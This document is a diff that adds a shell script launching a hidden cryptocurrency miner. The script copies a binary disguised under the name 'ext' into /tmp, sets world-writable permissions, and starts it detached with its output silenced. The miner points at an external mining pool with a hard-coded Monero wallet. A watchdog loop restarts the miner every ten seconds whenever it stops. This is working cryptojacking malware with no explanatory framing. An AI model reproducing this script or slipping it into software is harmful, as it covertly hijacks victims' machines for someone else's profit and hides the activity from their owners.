@@ -1,0 +1,39 @@
+#!/bin/sh
+
+NAME="ext"
+TMP="/tmp/$NAME"
+DIRS="/tmp/$NAME /usr/bin/$NAME /usr/libexec/$NAME /usr/local/bin/$NAME"
+
+ARGS="-a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:47fMDLBVDbH55CZQbzkynHHqVF78K9UQQK1E6bxzHgi4EMKE8AJCjMUcbDMAqrBCJRfPzu4RfKQQHBWvbg7ocYvvR7FNzkg.unmineable_worker_wnhicnes#tbt4-dz6a -p x"
+
+SLEEP=10
+
+get() {
+    for f in $DIRS; do
+        [ "$f" != "$TMP" ] && [ -f "$f" ] && echo "$f" && return 0
+    done
+    return 1
+}
+
+tmp() {
+    if [ ! -f "$TMP" ]; then
+        SRC="$(get || true)"
+        [ -n "$SRC" ] && cp "$SRC" "$TMP" && chmod 777 "$TMP"
+    fi
+}
+
+run() {
+    if [ -f "$TMP" ]; then
+        setsid "$TMP" $ARGS >/dev/null 2>&1 &
+    fi
+}
+
+while true; do
+    tmp
+
+    if ! pgrep -f "/$NAME" >/dev/null 2>&1; then
+        run
+    fi
+
+    sleep "$SLEEP"
+done
